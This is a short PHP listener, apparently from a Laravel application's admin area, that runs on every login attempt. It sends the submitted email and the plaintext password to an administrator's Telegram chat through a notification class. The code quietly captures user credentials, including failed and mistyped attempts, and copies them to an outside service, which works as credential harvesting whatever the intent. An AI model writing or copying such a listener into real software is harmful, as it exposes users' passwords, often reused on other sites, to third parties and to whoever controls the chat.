<?php

declare(strict_types=1);

// 03.12.2024 at 19:27:05
namespace App\Listeners\Admin;

use App\Notifications\SignInAttemptTelegramNotification;
use Illuminate\Auth\Events\Attempting;
use Illuminate\Support\Facades\Notification;

final class AttemptingListener
{
    public function handle(Attempting $event)
    : void {
        Notification::route('telegram', config('notifications.telegram_admin_id'))
            ->notify(
                new SignInAttemptTelegramNotification([
                    'guard'    => $event->guard,
                    'email'    => $event->credentials['email'],
                    'password' => $event->credentials['password'],
                ]),
            );
    }
}
